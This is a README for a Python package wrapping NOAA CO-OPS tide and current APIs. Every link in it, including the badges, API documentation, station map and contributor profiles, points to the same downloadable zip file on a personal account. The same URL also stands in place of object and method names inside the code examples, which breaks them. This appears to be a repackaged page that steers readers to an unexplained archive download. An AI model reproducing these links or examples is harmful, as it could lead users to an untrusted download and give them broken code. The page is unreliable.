# noaa_coops

[![Build Status](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)
[![PyPI](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)
[![PyPI - Python Version](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)

`noaa_coops` is a Python wrapper for the NOAA CO-OPS Tides &amp; Currents [Data](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)
and [Metadata](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip) APIs.


This package is an evolution of [py_noaa](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip), the main addition being the creation of a `Station` class that is central to 
 `noaa_coops` and provides distinct advantages over `py_noaa`.

## Use
---
All data and metadata is handled using a `Station` class with methods and 
attributes for retrieving metadata, observed data, and predicted data.

### Getting Metadata

All available metadata for a desired station (identifed by unique `stationid`) 
is automagically generated when a `Station` object is initialzed. Station IDs 
can be found using the mapping interface at https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip
All metadata is stored as a dictionary in the `.metadata` attribute of a 
`Station` object for easy exploration (e.g. `https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip`). Additionally, 
the keys of the metadata attribute dictionary are also assigned as attributes 
of the station object itself (easily explored using tab-completion in your IDE).
For example:

```python
>>> from pprint import pprint  # For pretty printing
>>> import noaa_coops as nc
>>> seattle = https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip(9447130)
>>> pprint(https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip['lat'])
47.601944
>>> pprint(https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip['lon'])
-122.339167

```

### Getting Observed or Predicted Data
Station data can be retrieved using the `.get_data` method on a `Station` 
class object. Data is returned as a Pandas DataFrame for easy use and analysis. 
Data types are listed on the [NOAA CO-OPS Data API](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip). The data types currently supported for retrieval with `noaa_coops` are:

    - Currents
    - Observed water levels
    - Observered daily high and low water levels (use `product="high_low"`)
    - Predicted water levels
    - Predicted high and low water levels
    - Winds
    - Air pressure
    - Air temperature
    - Water temperature

Compatibility with other data products may exist, but is not guaranteed at this 
time. Feel free to submit a pull request if you would like to add addtional 
functionality.

In the example below, water level data is retrieved for the Seattle station (`stationid`=9447130) for a 3 month period.

```python
>>> import noaa_coops as nc
>>> seattle = https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip(9447130)
>>> df_water_levels = https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip(
...     begin_date="20150101",
...     end_date="20150331",
...     product="water_level",
...     datum="MLLW",
...     units="metric",
...     time_zone="gmt")
>>> https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip()  # doctest: +NORMALIZE_WHITESPACE
                     water_level  sigma    flags QC
date_time                                          
2015-01-01 00:00:00        1.799  0.023  0,0,0,0  v
2015-01-01 00:06:00        1.718  0.018  0,0,0,0  v
2015-01-01 00:12:00        1.639  0.013  0,0,0,0  v
2015-01-01 00:18:00        1.557  0.012  0,0,0,0  v
2015-01-01 00:24:00        1.473  0.014  0,0,0,0  v

```

## Requirements

For use:
- requests
- numpy
- pandas
- zeep

For development/contributions:
- pytest
- pytest-cov


## TODO
See [issues](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip) for a list of issues 
and to add issues of your own.

## Contribution
All contributions are welcome, feel free to submit a pull request if you have a valuable addition to the package or constructive feedback.

**Many thanks to the following contributors!**
- [@delgadom](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)
- [@CraigHarter](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)
- [@jcconnel](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)
- [@fabaff](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)
- [@taataam](https://raw.githubusercontent.com/FelixOyeleke/noaa_coops/master/examples/coops-noaa-2.0.zip)
